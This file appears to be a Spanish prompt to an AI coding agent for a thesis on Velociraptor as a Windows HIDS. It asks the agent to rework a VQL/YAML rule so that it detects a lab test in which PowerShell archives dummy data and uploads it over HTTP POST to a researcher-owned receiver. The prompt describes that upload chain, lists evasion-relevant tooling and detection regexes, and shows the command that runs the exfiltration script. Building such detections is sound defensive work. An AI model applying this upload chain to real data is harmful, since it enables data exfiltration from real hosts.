@@ -1,0 +1,918 @@
+Estoy continuando un TFM sobre Velociraptor como HIDS/DFIR en Windows.
+
+Necesito que revises y mejores el artifact P3 para que detecte correctamente TEC-009 como exfiltración HTTP controlada de datos dummy en laboratorio.
+
+============================================================
+0. INSTRUCCIONES DE TRABAJO PARA CODEX
+============================================================
+
+Actúa como experto técnico senior en:
+
+- Velociraptor.
+- VQL/YAML.
+- Windows Event Logs.
+- Sysmon.
+- PowerShell Script Block Logging 4104.
+- DFIR/HIDS.
+- MITRE ATT&CK Enterprise.
+- Detección host-based.
+- Reducción de falsos positivos.
+
+Tu tarea NO es validar experimentalmente.
+Tu tarea es revisar evidencias, ajustar lógica de detección y crear una nueva versión del artifact.
+
+La validación final la haré yo ejecutando la campaña en laboratorio.
+
+============================================================
+1. CONTEXTO GENERAL DEL TFM
+============================================================
+
+Proyecto:
+Evaluación de Velociraptor como HIDS/DFIR para detectar técnicas MITRE ATT&CK en Windows.
+
+Arquitectura metodológica:
+
+- P4/P3/P2/P1 como perfiles de artifacts.
+- CU-001 a CU-009 como casos de uso.
+- Router/JSONL/Discord son salida externa, no detección.
+- CLIENT_EVENT detecta.
+- SERVER_EVENT enruta/persiste/notifica.
+- JSONL persiste evidencia.
+- Discord notifica, pero no detecta.
+
+Reglas metodológicas obligatorias:
+
+- Separar siempre:
+  - visibilidad;
+  - detección;
+  - alerta RT;
+  - evidencia forense;
+  - salida externa.
+- No usar rutas de laboratorio como IOC.
+- No usar nombres de scripts como IOC.
+- No usar DUMB_LAB como IOC.
+- No usar dump_exfil como IOC.
+- No usar datos_robados como IOC.
+- No usar etiquetas TEC, comentarios internos ni nombres de carpeta como IOC.
+- No tratar Sysmon ID 26 como alerta individual.
+- No tocar P2.
+- No tocar P1.
+- No tocar router.
+- No activar Discord.
+- Primero debe funcionar P3_v6 como CLIENT_EVENT visible en UI.
+
+============================================================
+2. RUTAS QUE DEBES REVISAR
+============================================================
+
+Carpeta de artifacts:
+
+C:\Users\julio\Desktop\TFM\artifacts_candidate
+
+Archivos relevantes:
+
+- Custom.TFM.HIDS.P3.Medium.Behavioral_v5.yaml
+- Custom.TFM.HIDS.P4.Low.Basic_v2.yaml
+- Custom.TFM.HIDS.Router.JSONL.Discord.Final_v3_fix3.yaml
+
+Carpeta de scripts:
+
+C:\Users\julio\Desktop\TFM\scripts_candidate
+
+Archivos relevantes:
+
+- exfiltracion_v3.ps1
+- receiver_tfm_v4.py
+- Start-TFMReceiver_v4.ps1
+- Stop-TFMReceiver.ps1
+- received\receiver_log.jsonl
+- ZIP recibido en received\
+
+Artifact base:
+
+C:\Users\julio\Desktop\TFM\artifacts_candidate\Custom.TFM.HIDS.P3.Medium.Behavioral_v5.yaml
+
+Artifact nuevo que debes crear:
+
+C:\Users\julio\Desktop\TFM\artifacts_candidate\Custom.TFM.HIDS.P3.Medium.Behavioral_v6.yaml
+
+No sobrescribas P3_v5.
+
+============================================================
+3. ESTADO ACTUAL
+============================================================
+
+Estado validado:
+
+- P4_v2 funciona.
+- P3_v5 genera más evidencia que versiones previas.
+- P3_v5 sigue sin detectar correctamente CU-009/TEC-009 en UI.
+- La red ya funciona mediante adaptador puente.
+- El receiver HTTP ya funciona.
+- El ZIP dummy se ha transferido efectivamente desde la VM al host.
+- El problema ya no está en red, receiver ni script.
+- El problema está en la lógica de detección de CU-009 dentro de P3_v5.
+
+No quiero:
+
+- Crear TEC-009B.
+- Modificar P2/P1.
+- Crear router nuevo todavía.
+- Activar Discord.
+- Cambiar la arquitectura P4/P3/P2/P1.
+- Usar rutas o nombres de script como IOC.
+- Cambiar CU_ID ni MITRE_ID sin justificación.
+
+Quiero:
+
+- Crear P3_v6 partiendo de P3_v5.
+- Mantener intacto lo que ya funciona.
+- Corregir únicamente CU-009.
+
+============================================================
+4. DEFINICIÓN METODOLÓGICA CORRECTA DE TEC-009
+============================================================
+
+TEC-009 debe interpretarse como:
+
+“staging, archivado y exfiltración HTTP controlada de datos dummy en laboratorio”.
+
+Matiz obligatorio:
+
+- Sí hay transferencia efectiva de datos.
+- Sí hay exfiltración controlada de un ZIP dummy.
+- No hay exfiltración de datos sensibles reales.
+- No hay credenciales reales.
+- No hay datos corporativos.
+- No hay terceros comprometidos.
+- El receptor HTTP pertenece al investigador.
+- La prueba es válida para evaluar detección host-based de comportamiento compatible con exfiltración.
+
+Formulación académica correcta:
+
+“TEC-009 reproduce una cadena controlada de staging, archivado y exfiltración HTTP de datos dummy en laboratorio. El archivo ZIP generado en la VM es transferido mediante HTTP POST hacia un receptor propio del investigador, registrándose HTTP 200, bytes recibidos y hash SHA256. Por tanto, la técnica permite evaluar detección de exfiltración a nivel host-based sin utilizar datos sensibles reales.”
+
+No escribir:
+
+- “exfiltración real de datos sensibles”.
+- “robo de datos”.
+- “compromiso real”.
+- “exfiltración a un atacante”.
+
+Sí escribir:
+
+- “exfiltración HTTP controlada de datos dummy”.
+- “transferencia efectiva del ZIP dummy”.
+- “receptor HTTP propio del laboratorio”.
+- “evidencia externa de recepción mediante receiver_log”.
+
+============================================================
+5. MITRE CORRECTO PARA CU-009
+============================================================
+
+CU_ID:
+
+CU-009
+
+ID_Tecnica_Interna:
+
+TEC-009
+
+MITRE_ID principal:
+
+- T1074.001 Local Data Staging.
+- T1560.001 Archive via Utility.
+- T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol.
+
+MITRE_Tactic:
+
+- Collection.
+- Exfiltration.
+
+T1020 Automated Exfiltration puede aparecer solo como contexto si se justifica por automatización del script, pero no debe sustituir a T1048.003.
+
+AlertName recomendado:
+
+Controlled HTTP Exfiltration of Dummy ZIP Data
+
+CU_Reason recomendado:
+
+Controlled HTTP exfiltration of dummy ZIP data from monitored endpoint to researcher-owned lab receiver.
+
+CU_Evidence recomendado:
+
+Compress-Archive + Copy-Item + Get-FileHash + Invoke-WebRequest POST -InFile + application/zip + Sysmon network connection + receiver_log with bytes_received and SHA256.
+
+============================================================
+6. SCRIPT TEC-009 ACTUAL
+============================================================
+
+Script:
+
+C:\Users\julio\Desktop\TFM\scripts_candidate\exfiltracion_v3.ps1
+
+Comportamiento real:
+
+1. Genera staging local.
+2. Comprime datos dummy mediante Compress-Archive.
+3. Copia el ZIP mediante Copy-Item.
+4. Calcula SHA256 local mediante Get-FileHash.
+5. Realiza subida HTTP mediante Invoke-WebRequest.
+6. Usa método POST.
+7. Usa -InFile para enviar el ZIP.
+8. Usa ContentType application/zip.
+9. Usa UserAgent TFM-TEC009-ControlledUpload/3.0.
+10. Usa ReceiverUrl http://192.168.1.129:8088/upload.
+11. Genera summary JSON.
+12. Informa HTTP status y UploadSucceeded.
+
+Fragmentos comportamentales relevantes:
+
+- Compress-Archive.
+- Copy-Item.
+- Get-FileHash -Algorithm SHA256.
+- Invoke-WebRequest.
+- -Method POST.
+- -InFile.
+- -ContentType application/zip.
+- -UserAgent.
+- http://
+- /upload.
+- application/zip.
+- ZIP transferido.
+- HTTP 200.
+- UploadSucceeded True.
+
+No usar como IOC:
+
+- exfiltracion_v3.ps1.
+- Ruta del script.
+- DUMB_LAB.
+- dump_exfil.
+- datos_robados.
+- etiquetas TEC.
+- comentarios internos.
+
+============================================================
+7. RECEIVER HTTP ACTUAL
+============================================================
+
+Receiver:
+
+C:\Users\julio\Desktop\TFM\scripts_candidate\receiver_tfm_v4.py
+
+Ejecución usada:
+
+python .\receiver_tfm_v4.py --host 0.0.0.0 --port 8088 --out-dir .\received --log-file .\received\receiver_log.jsonl --max-seconds 600 --max-uploads 5 --max-bytes 104857600
+
+Red usada:
+
+- Host bridge: 192.168.1.129.
+- VM bridge: 192.168.1.143.
+- Puerto: 8088.
+- URL: http://192.168.1.129:8088/upload.
+
+El receiver validó:
+
+- GET /health desde la VM.
+- POST /upload desde la VM.
+- Recepción del ZIP.
+- bytes_received.
+- saved_file.
+- sha256.
+- user_agent.
+- content_type.
+
+============================================================
+8. EVIDENCIA REAL VALIDADA
+============================================================
+
+receiver_log.jsonl contiene evidencia externa de recepción.
+
+Datos relevantes:
+
+- receiver_start en 0.0.0.0:8088.
+- health desde 192.168.1.143.
+- POST /upload desde 192.168.1.143.
+- bytes_received = 2104614.
+- saved_file = received\upload_20260610_145624_068168.zip.
+- sha256 = 216b43d135cbaae0c352005ffb0498f2a39700f156f611ae6b3c1770ae91d09c.
+- user_agent = TFM-TEC009-ControlledUpload/3.0.
+- content_type = application/zip.
+- receiver_stop con uploads = 1.
+
+Timestamp UTC:
+
+2026-06-10T14:56:24.068168+00:00
+
+Hora local España aproximada:
+
+2026-06-10 16:56:24
+
+Conclusión:
+
+La transferencia HTTP controlada sí ocurrió.
+El ZIP dummy salió de la VM monitorizada y fue recibido en el host del investigador.
+P3_v6 debe detectar esta cadena como exfiltración HTTP controlada de datos dummy.
+
+============================================================
+9. HIPÓTESIS TÉCNICA DEL FALLO DE P3_v5
+============================================================
+
+P3_v5 probablemente falla porque CU-009 sigue buscando patrones antiguos o demasiado restrictivos:
+
+- TcpClient.
+- example.com.
+- DNS externo.
+- DestinationPort 80/443.
+- destino externo público.
+- Sysmon ID 11 obligatorio.
+- red contextual sin upload real.
+- lógica pensada para versión previa de TEC-009.
+
+Pero el script actual usa:
+
+- Invoke-WebRequest.
+- -Method POST.
+- -InFile.
+- -ContentType application/zip.
+- UserAgent TFM-TEC009-ControlledUpload/3.0.
+- URL por IP privada bridge.
+- Puerto 8088.
+- POST /upload.
+
+Por tanto, P3_v6 debe contemplar:
+
+- Invoke-WebRequest como señal fuerte.
+- -InFile como señal fuerte de envío de archivo.
+- -Method POST como señal de subida HTTP.
+- ContentType application/zip como señal de archivo comprimido.
+- UserAgent como evidencia de laboratorio, pero no como único IOC.
+- Puerto 8088 como contexto de laboratorio, pero no como única detección.
+- IP 192.168.1.129 como contexto de laboratorio, pero no como única detección.
+- Sysmon ID 3 con powershell.exe hacia 192.168.1.129:8088.
+- Posible ausencia de Sysmon ID 11 para .zip.
+- Posible ausencia de Sysmon ID 22 porque la URL usa IP y no dominio.
+
+Reglas negativas importantes:
+
+- No hacer obligatorio DNS ID 22.
+- No hacer obligatorio puerto 80/443.
+- No hacer obligatorio destino público externo.
+- No hacer obligatorio Sysmon ID 11.
+- No hacer obligatorio TcpClient.
+- No hacer obligatorio example.com.
+- No hacer obligatorio DestinationHostname.
+
+============================================================
+10. LÓGICA DE DETECCIÓN PROPUESTA PARA CU-009 EN P3_v6
+============================================================
+
+Crear o corregir sources CU-009.
+
+------------------------------------------------------------
+10.1 Source 4104 — PowerShell staging/archive/upload
+------------------------------------------------------------
+
+Nombre recomendado:
+
+CU009_Source_TEC009_Staging_Upload_Behavioral_4104
+
+Fuente:
+
+Microsoft-Windows-PowerShell/Operational
+EventID 4104
+
+Debe detectar combinaciones comportamentales.
+
+Grupo A — staging/archive:
+
+- Compress-Archive.
+- .zip.
+- Copy-Item.
+- Get-FileHash.
+
+Grupo B — upload HTTP:
+
+- Invoke-WebRequest.
+- iwr.
+- wget.
+- curl si aparece como alias PowerShell.
+- -Method POST.
+- Method POST.
+- -InFile.
+- InFile.
+- -ContentType application/zip.
+- application/zip.
+- http://.
+- https://.
+- /upload.
+- UserAgent.
+
+Criterios válidos de detección:
+
+A) Compress-Archive + Copy-Item.
+
+O
+
+B) Compress-Archive + Invoke-WebRequest.
+
+O
+
+C) .zip + Invoke-WebRequest + InFile.
+
+O
+
+D) Invoke-WebRequest + InFile + POST.
+
+O
+
+E) application/zip + POST + InFile.
+
+O
+
+F) Get-FileHash + Invoke-WebRequest + InFile.
+
+Prioridad:
+
+Esta source debe ser la señal más fuerte de CU-009 en P3.
+
+Severidad:
+
+High.
+
+Confidence:
+
+High si hay staging + upload.
+Medium/High si solo hay upload con ZIP.
+
+Exclusiones:
+
+- Excluir CryptoStrongRegex para no pisar CU-007.
+- Excluir DestructionStrongRegex para no pisar CU-008.
+- Excluir RouterSelfRegex para no detectar JSONL/router.
+- No excluir ForEach-Object, Where-Object ni Select-Object globalmente.
+
+------------------------------------------------------------
+10.2 Source Sysmon ID 1 — proceso PowerShell con upload
+------------------------------------------------------------
+
+Nombre recomendado:
+
+CU009_Source_TEC009_Staging_Upload_Behavioral_Sysmon_Process
+
+Fuente:
+
+Microsoft-Windows-Sysmon/Operational
+EventID 1
+
+Debe detectar:
+
+- Image contiene powershell.exe o pwsh.exe.
+- CommandLine contiene combinaciones de:
+  - Invoke-WebRequest;
+  - iwr;
+  - -InFile;
+  - POST;
+  - application/zip;
+  - upload;
+  - Compress-Archive;
+  - Copy-Item;
+  - Get-FileHash;
+  - .zip;
+  - http://;
+  - https://.
+
+Criterios recomendados:
+
+A) powershell/pwsh + Invoke-WebRequest + InFile.
+
+O
+
+B) powershell/pwsh + POST + application/zip.
+
+O
+
+C) powershell/pwsh + Compress-Archive + Invoke-WebRequest.
+
+O
+
+D) powershell/pwsh + .zip + upload + http.
+
+Severidad:
+
+High.
+
+Confidence:
+
+Medium/High.
+
+Nota:
+
+No depender del nombre del script ni de la ruta.
+
+------------------------------------------------------------
+10.3 Source Sysmon ID 3 — conexión HTTP de PowerShell
+------------------------------------------------------------
+
+Nombre recomendado:
+
+CU009_Source_TEC009_Controlled_HTTP_Exfil_Sysmon_Network
+
+Fuente:
+
+Microsoft-Windows-Sysmon/Operational
+EventID 3
+
+Debe detectar:
+
+- Image contiene powershell.exe o pwsh.exe.
+- Initiated = true.
+- DestinationPort no limitado a 80/443.
+- Permitir 8088 como puerto de laboratorio.
+- Permitir destinos privados si el receptor es de laboratorio.
+- DestinationIp puede ser 192.168.1.129 como contexto.
+- DestinationHostname puede estar vacío.
+
+Criterio:
+
+La red por sí sola es evidencia contextual.
+Debe generar CU-009 con Confidence Medium si no está correlacionada con 4104/ID1.
+
+CU_Reason:
+
+PowerShell initiated HTTP connection to controlled lab receiver, supporting controlled dummy-data exfiltration chain.
+
+No afirmar por esta source sola que se transfirió el ZIP, salvo que P3 implemente correlación con 4104/ID1.
+Si no hay correlación en P3, expresar como “network evidence supporting CU-009”.
+
+------------------------------------------------------------
+10.4 Source Sysmon ID 11 — ZIP opcional
+------------------------------------------------------------
+
+Nombre recomendado:
+
+CU009_Source_TEC009_Archive_FileCreate_Sysmon_Zip_Optional
+
+Fuente:
+
+Microsoft-Windows-Sysmon/Operational
+EventID 11
+
+Debe detectar:
+
+- TargetFilename termina en .zip.
+- Image contiene powershell.exe o pwsh.exe si está disponible.
+
+No hacerlo obligatorio.
+
+Severidad:
+
+Medium.
+
+Confidence:
+
+Medium.
+
+CU_Reason:
+
+ZIP archive creation consistent with local staging/archive phase of CU-009.
+
+------------------------------------------------------------
+10.5 Source Sysmon ID 22 — DNS opcional
+------------------------------------------------------------
+
+Nombre recomendado:
+
+CU009_Source_TEC009_DNS_Context_Sysmon_Optional
+
+Fuente:
+
+Microsoft-Windows-Sysmon/Operational
+EventID 22
+
+Debe mantenerse si ya existe, pero no debe ser requisito.
+
+Motivo:
+
+La URL actual usa IP, por lo que puede no existir DNS.
+
+============================================================
+11. CAMPOS NORMALIZADOS OBLIGATORIOS
+============================================================
+
+Cada source CU-009 debe devolver, aunque algunos campos queden vacíos si no aplican:
+
+- DetectionTime
+- ClientId
+- Hostname
+- CU_ID
+- ID_Tecnica_Interna
+- MITRE_ID
+- MITRE_Tactic
+- MITRE_Tactic_Context
+- SignalType
+- AlertName
+- Severity
+- Priority
+- Confidence
+- DetectionScope
+- OutputType
+- FP_Risk
+- CU_Reason
+- CU_Evidence
+- EventID
+- Channel
+- Provider
+- Image
+- CommandLine
+- ParentImage
+- ParentCommandLine
+- User
+- Hashes
+- ProcessGuid
+- ProcessId
+- ParentProcessId
+- TargetFilename
+- DestinationIp
+- DestinationPort
+- DestinationHostname
+- DetectionLogic
+- FalsePositiveReduction
+- BenchmarkScenario
+- ArtifactProfile
+
+Valores recomendados para CU-009:
+
+CU_ID:
+
+CU-009
+
+ID_Tecnica_Interna:
+
+TEC-009
+
+MITRE_ID:
+
+T1074.001 / T1560.001 / T1048.003
+
+MITRE_Tactic:
+
+Collection / Exfiltration
+
+MITRE_Tactic_Context:
+
+Controlled HTTP exfiltration of dummy data in lab; no sensitive real data involved.
+
+ArtifactProfile:
+
+P3 Medium Behavioral
+
+OutputType:
+
+Detection / Alert RT candidate
+
+============================================================
+12. PRIORIDAD SEMÁNTICA
+============================================================
+
+Mantener prioridad:
+
+1. CU-007 / TEC-007 ransomware/crypto.
+2. CU-009 / TEC-009 staging/archive/exfiltración HTTP controlada.
+3. CU-008 / TEC-008 destruction.
+4. CU-006 / TEC-006 discovery.
+5. CU-001 / TEC-001 PowerShell genérico.
+
+Reglas:
+
+- Si hay AES/CryptoStream/.aes, clasificar como CU-007 antes que CU-009.
+- Si hay Compress-Archive + Invoke-WebRequest + InFile, clasificar como CU-009 antes que CU-001.
+- Si hay Remove-Item y también staging/upload, priorizar CU-009 salvo patrón destructivo claro.
+- No duplicar alertas innecesariamente si puede emitirse una alerta de mayor especificidad.
+
+============================================================
+13. FALSOS POSITIVOS Y FALSOS NEGATIVOS
+============================================================
+
+Riesgos de falso positivo:
+
+- Scripts administrativos que usen Invoke-WebRequest + InFile.
+- Subida legítima de logs/paquetes ZIP.
+- Automatizaciones internas de backup.
+- Despliegues DevOps.
+- Herramientas de administración que transfieran archivos por HTTP.
+
+Mitigación:
+
+- Exigir combinación de señales:
+  - staging/archive + upload;
+  - ZIP + POST + InFile;
+  - PowerShell + HTTP + archivo;
+  - hash + upload;
+  - Sysmon network como apoyo, no único criterio fuerte.
+- No alertar por Invoke-WebRequest aislado.
+- No alertar por .zip aislado.
+- No alertar por conexión de red aislada salvo como Confidence Medium/contextual.
+- No usar rutas de laboratorio como reducción de FP.
+
+Riesgos de falso negativo:
+
+- Upload con .NET WebClient.
+- Upload con curl.exe real.
+- Upload con certutil/bitsadmin.
+- Upload con HTTPS sin command line visible.
+- Script ofuscado.
+- 4104 no habilitado o truncado.
+- Sysmon sin ID 3/11/22 configurados.
+- Uso de otro Content-Type.
+- Uso de PUT en vez de POST.
+
+Mitigación:
+
+- Mantener 4104 + Sysmon ID1 + Sysmon ID3.
+- No exigir puerto concreto.
+- No exigir DNS.
+- No exigir destino público.
+- No exigir Sysmon ID11.
+- Diseñar regex flexibles para Invoke-WebRequest/iwr/POST/InFile/application/zip/http/upload.
+
+============================================================
+14. VALIDACIÓN QUE DEBES DEVOLVERME
+============================================================
+
+Después de crear P3_v6, responde con:
+
+1. Ruta exacta del archivo creado.
+2. Qué cambia respecto a P3_v5.
+3. Qué se mantiene intacto.
+4. Sources CU-009 nuevas/modificadas.
+5. EventID usado por cada source.
+6. Regex nuevos o modificados.
+7. Por qué ahora debería detectar exfiltracion_v3.ps1.
+8. Riesgo de falsos positivos.
+9. Riesgo de falsos negativos.
+10. Si requiere router nuevo después.
+11. Orden exacto de importación.
+12. Comandos de validación.
+13. Comandos para extraer evidencia Sysmon/4104 en la ventana 16:55–16:58.
+14. Criterio de éxito final.
+
+============================================================
+15. COMANDOS DE VALIDACIÓN QUE DEBES INCLUIR
+============================================================
+
+------------------------------------------------------------
+15.1 PowerShell 4104 en VM
+------------------------------------------------------------
+
+$t0 = Get-Date "2026-06-10 16:55:00"
+$t1 = Get-Date "2026-06-10 16:58:00"
+
+Get-WinEvent -FilterHashtable @{
+    LogName="Microsoft-Windows-PowerShell/Operational"
+    Id=4104
+    StartTime=$t0
+    EndTime=$t1
+} | Where-Object {
+    $_.Message -match "Compress-Archive|Copy-Item|Invoke-WebRequest|InFile|application/zip|Get-FileHash|upload|POST|UserAgent"
+} | Select-Object TimeCreated,Id,ProviderName,Message | Format-List
+
+------------------------------------------------------------
+15.2 Sysmon ID 1/3/11/22 en VM
+------------------------------------------------------------
+
+$t0 = Get-Date "2026-06-10 16:55:00"
+$t1 = Get-Date "2026-06-10 16:58:00"
+
+Get-WinEvent -FilterHashtable @{
+    LogName="Microsoft-Windows-Sysmon/Operational"
+    StartTime=$t0
+    EndTime=$t1
+} | Where-Object {
+    $_.Id -in @(1,3,11,22) -and
+    $_.Message -match "powershell|pwsh|Invoke-WebRequest|InFile|POST|application/zip|8088|192\.168\.1\.129|\.zip|upload|http"
+} | Select-Object TimeCreated,Id,ProviderName,Message | Format-List
+
+------------------------------------------------------------
+15.3 Ejecutar de nuevo TEC-009 en VM
+------------------------------------------------------------
+
+cd C:\Users\seguridad\Desktop\TFM\Pruebas\TEC-009_Exfiltracion
+
+.\exfiltracion_v3.ps1 `
+  -ReceiverUrl "http://192.168.1.129:8088/upload" `
+  -EnableUpload $true `
+  -TimeoutSec 60 `
+  -KeepArtifacts $true
+
+------------------------------------------------------------
+15.4 Verificar ZIP local en VM
+------------------------------------------------------------
+
+Get-ChildItem "C:\Users\seguridad\Desktop\TFM" -Recurse -Filter *.zip |
+Sort-Object LastWriteTime -Descending |
+Select-Object -First 5 FullName,Length,LastWriteTime
+
+------------------------------------------------------------
+15.5 Verificar hash local en VM
+------------------------------------------------------------
+
+Get-FileHash "RUTA_DEL_ZIP" -Algorithm SHA256
+
+------------------------------------------------------------
+15.6 Verificar receiver en host
+------------------------------------------------------------
+
+cd C:\Users\julio\Desktop\TFM\scripts_candidate
+
+Get-Content .\received\receiver_log.jsonl -Tail 10
+
+Get-ChildItem .\received |
+Sort-Object LastWriteTime -Descending |
+Select-Object -First 10 Name,Length,LastWriteTime
+
+============================================================
+16. ORDEN EXACTO DE IMPORTACIÓN/PRUEBA
+============================================================
+
+1. Crear P3_v6 en artifacts_candidate.
+2. Importar Custom.TFM.HIDS.P3.Medium.Behavioral_v6.yaml en Velociraptor.
+3. Mantener P4_v2 activo.
+4. Desactivar P3_v5 para evitar duplicidades.
+5. Activar P3_v6.
+6. No activar P2.
+7. No activar P1.
+8. No activar router nuevo.
+9. No activar Discord.
+10. Ejecutar solo TEC-009 primero.
+11. Confirmar CU-009 en UI.
+12. Después ejecutar campaña completa.
+13. Confirmar que CU-006, CU-007 y CU-008 siguen funcionando.
+14. Solo después crear router compatible con P3_v6.
+
+============================================================
+17. CRITERIO DE ÉXITO DE P3_v6
+============================================================
+
+P3_v6 será válido si:
+
+- CU-009 aparece en UI.
+- CU-009 detecta staging/archive/exfiltración HTTP controlada.
+- CU-009 usa T1074.001 / T1560.001 / T1048.003.
+- CU-009 no depende de rutas de laboratorio.
+- CU-009 no depende del nombre exfiltracion_v3.ps1.
+- CU-009 no depende de DUMB_LAB.
+- CU-009 no depende de dump_exfil.
+- CU-009 no depende de datos_robados.
+- CU-009 no exige DNS.
+- CU-009 no exige puerto 80/443.
+- CU-009 no exige destino público externo.
+- CU-009 no exige Sysmon ID 11.
+- CU-009 no exige TcpClient.
+- CU-009 no exige example.com.
+- CU-006 sigue apareciendo.
+- CU-007 sigue apareciendo por crypto/AES/.aes.
+- CU-008 sigue apareciendo.
+- P2/P1/Discord/router siguen desactivados.
+
+============================================================
+18. FORMULACIÓN ACADÉMICA FINAL
+============================================================
+
+Usar esta formulación:
+
+“TEC-009 reproduce una cadena controlada de staging, archivado y exfiltración HTTP de datos dummy en laboratorio. La prueba no implica exfiltración de información sensible real ni compromiso de terceros, pero sí transferencia efectiva de un ZIP dummy desde el endpoint monitorizado hacia un receptor HTTP propio. La evidencia queda respaldada por la generación del archivo comprimido, la ejecución de Invoke-WebRequest mediante POST con InFile, la conexión de red registrada por Sysmon y el receiver_log.jsonl con bytes recibidos y hash SHA256.”
+
+No usar esta formulación:
+
+“TEC-009 no es exfiltración.”
+
+Sustituir por:
+
+“TEC-009 no es exfiltración de datos sensibles reales; es exfiltración controlada de datos dummy en laboratorio.”
+
+============================================================
+19. IMPORTANTE FINAL
+============================================================
+
+No sobrescribas P3_v5.
+Crea P3_v6.
+Corrige únicamente CU-009.
+No crees router todavía.
+No actives Discord.
+No cambies CU_ID.
+No cambies la arquitectura P4/P3/P2/P1.
+No uses rutas/scripts/lab markers como IOC.
+No conviertas JSONL en detección.
+No conviertas Discord en detección.
+No conviertas Sysmon ID 3 aislado en prueba completa de exfiltración.
+La prueba completa se sostiene por:
+- staging;
+- ZIP;
+- hash;
+- POST;
+- InFile;
+- application/zip;
+- conexión de red;
+- receiver_log con bytes y SHA256.
